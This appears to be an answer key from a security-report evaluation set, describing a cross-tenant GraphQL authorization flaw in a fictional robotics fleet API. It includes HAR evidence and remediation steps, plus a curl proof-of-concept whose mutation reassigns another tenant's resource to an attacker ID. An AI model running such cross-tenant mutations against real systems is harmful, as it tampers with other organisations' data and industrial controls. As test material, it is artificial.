# Expected Response

## System
- Domain: Industrial IoT / Manufacturing
- System: ManuControl Robotics Fleet
- Example ID: GQL-0107

## Priority Findings

### Finding 1: Industrial IoT — Single GraphQL Endpoint Exposes Cross-Tenant Robotics Data (Pattern 9.1)
**Severity:** Critical
**Category:** GraphQL Platform / Single Endpoint Vulnerability

**Summary:**
Per §5.0 (Pattern 9.1 — GraphQL single endpoint vulnerabilities): The unified GraphQL endpoint `api.manucontrol-robotics.example.com/graphql` does not enforce per-operation tenant isolation. An attacker from `tenant-4b76` issued `updateResource(id: "R-2107", input: {status: "approved", ownerId: "attacker-4b769e8f"})` against a robotics fleet resource belonging to `tenant-9e8f`. The server accepted the mutation and returned cross-tenant data. In Industrial IoT, unauthorized control of robotics fleet resources creates safety and operational sabotage risk.

**Evidence from HAR:**
- Request: `POST https://api.manucontrol-robotics.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-4b76`
- Mutation: `updateResource(id: "R-2107", input: {status: "approved", ownerId: "attacker-4b769e8f"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-9e8f"`, `ownerId: "other-user-4b769e8f"`, `sensitiveField: "CONFIDENTIAL-4b769e8f"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-4b769e8f`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 9.1 | Single GraphQL endpoint, no op-level tenant isolation |
| HAR request | x-tenant-id | Attacker tenant-4b76 |
| HAR request | input.ownerId | Client-injected attacker-4b769e8f |
| HAR response | tenantId | Cross-tenant tenant-9e8f data returned |

## Steps to Reproduce

### Step 1 — Cross-tenant mutation via single endpoint (HAR)
```bash
curl -s -X POST https://api.manucontrol-robotics.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4b76" \
  -d '{"query": "mutation { updateResource(id: \"R-2107\", input: {status: \"approved\", ownerId: \"attacker-4b769e8f\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-9e8f` robotics resource mutated. **Secure:** FORBIDDEN.

## Remediation
1. Per-operation tenant guard middleware on the single GraphQL endpoint.
2. Resolver ownership: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `ResourceInput`.
4. Disable GraphQL introspection in production.
